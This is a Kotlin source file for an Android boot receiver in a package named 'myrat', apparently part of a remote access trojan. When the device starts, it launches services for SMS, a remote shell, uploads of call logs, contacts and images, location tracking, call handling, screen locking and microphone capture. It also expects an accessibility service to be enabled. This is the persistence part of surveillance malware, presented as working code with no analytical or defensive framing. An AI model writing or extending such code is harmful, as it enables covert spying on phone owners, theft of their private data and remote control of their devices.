package com.myrat.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import com.myrat.app.service.*
import com.myrat.app.utils.Logger

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (Intent.ACTION_BOOT_COMPLETED == intent?.action) {
            Logger.log("Boot completed, starting all services")
            
            // Start all services
            val services = listOf(
                SmsService::class.java,
                ShellService::class.java,
                CallLogUploadService::class.java,
                ContactUploadService::class.java,
                ImageUploadService::class.java,
                LocationService::class.java,
                CallService::class.java,
                LockService::class.java,
                MicrophoneService::class.java
            )

            services.forEach { serviceClass ->
                try {
                    val serviceIntent = Intent(context, serviceClass)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }
                    Logger.log("Started service: ${serviceClass.simpleName}")
                } catch (e: Exception) {
                    Logger.error("Failed to start service: ${serviceClass.simpleName}", e)
                }
            }

            // Start unified accessibility service (this will be done through settings)
            Logger.log("All services started. Unified accessibility service should be enabled in settings.")
        }
    }
}